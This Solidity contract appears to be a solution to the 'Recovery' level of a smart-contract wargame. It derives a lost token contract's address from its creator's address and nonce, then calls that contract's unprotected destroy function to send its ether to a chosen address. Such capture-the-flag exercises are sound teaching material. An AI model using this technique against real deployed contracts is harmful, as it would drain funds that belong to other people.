//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/Recovery.sol";

contract N17RecoveryAttacker {
    SimpleToken victim;

    function recover(
        address userAddr,
        uint256 nonce,
        address payable fundsToAddr
    ) external {
        address rlpCalculatedAddress = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            uint8(0xd6),
                            uint8(0x94),
                            userAddr,
                            uint8(nonce)
                        )
                    )
                )
            )
        );

        victim = SimpleToken(payable(rlpCalculatedAddress));
        victim.destroy(fundsToAddr);
    }
}
